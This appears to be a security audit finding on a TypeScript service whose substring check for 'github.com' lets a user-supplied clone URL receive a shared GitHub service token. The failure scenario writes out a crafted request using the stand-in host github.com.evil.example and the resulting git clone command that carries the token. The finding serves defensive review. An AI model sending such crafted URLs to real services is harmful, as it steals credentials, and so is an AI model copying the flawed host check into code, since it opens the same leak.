reason: gitAuthArgs in src/git-auth.ts:8 decides whether to attach the GitHub service token using `remoteUrl.includes("github.com")`, a plain substring test. It does not parse the URL or compare the host, so any URL containing that string anywhere (hostname suffix, path, or userinfo) passes and gets `-c http.extraHeader=Authorization: Bearer <token>` (line 9). cloneRepo in src/worktree.ts:15 calls gitAuthArgs(repo.remoteUrl, SERVICE_TOKEN) and then runs `git clone repo.remoteUrl`, so the header is sent to whatever host the URL names; http.extraHeader is a process-wide git option, not scoped to github.com. The URL is fully user-controlled: registerRepo in src/routes.ts:19-22 reads remoteUrl from req.body, checks only that it is non-empty, and passes it to store.insertRepo (no validation, src/store.ts:16-18) and cloneRepo. SERVICE_TOKEN is a single shared HARBOR_GITHUB_TOKEN (src/config.ts:4). There is no host allowlist, URL parser, or test anywhere in src/ that would prevent this, and the repo has no test files.
failure_scenario: An authenticated user calls registerRepo (src/routes.ts:18) with body `{ id: "x", remoteUrl: "https://github.com.evil.example/x.git" }`. The presence check on line 20 passes. cloneRepo (src/worktree.ts:15) calls gitAuthArgs, whose `includes("github.com")` test on src/git-auth.ts:8 matches, so git is invoked as `git -c "http.extraHeader=Authorization: Bearer <HARBOR_GITHUB_TOKEN>" clone https://github.com.evil.example/x.git …`. Git connects to the attacker's server and sends the service token in the Authorization header; the attacker's HTTP log now contains the token.
severity_reason: This is an exploitable secret-exfiltration flaw reachable by any authenticated user via a normal API call with a single crafted field. The leaked value is the shared HARBOR_GITHUB_TOKEN service credential (src/config.ts:4) used for all repositories, so one request compromises the service's entire GitHub access. No configuration or code in the repository mitigates it.
